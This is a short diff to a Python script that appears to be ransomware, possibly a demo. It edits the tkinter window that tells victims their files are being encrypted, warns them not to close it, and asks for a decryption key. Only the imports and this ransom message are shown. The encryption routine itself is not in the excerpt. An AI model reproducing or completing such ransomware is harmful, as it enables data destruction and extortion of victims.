@@ -1,10 +1,8 @@
 #!/usr/bin/env python
-import shlex
-from pathlib import Path
 
+from pathlib import Path
 from Cryptodome.Cipher import AES
 from Cryptodome.Util import Counter
-import argparse
 import os
 import discover
 import modify
@@ -32,7 +30,7 @@ class WindowThread(threading.Thread):
         frame = tkinter.Frame(root)
         frame.grid()
         frame.pack()
-        oops = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
+        oops = tkinter.Label(frame, text="Oops... Looks like someone encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
         oops.pack()
         # warning that if program closes early, one file will be in a partially encrypted limbo state
         warning = tkinter.Label(root,
@@ -40,7 +38,8 @@ class WindowThread(threading.Thread):
                                    "until this window says it is safe to do so... "
                                    "\nor face (some) permanent damage.\n You have been warned\n"
                                    "When encryption is complete, look for the key. "
-                                   "It's hidden somewhere on this system"
+                                   "It's hidden somewhere on this system\n"
+                                "This will most likely take a while... so be patient"
                                 , font=('Helvetica', 20))
         warning.pack()
         label = tkinter.Label(frame, text="Enter the decryption key below", font=('Helvetica', 20))
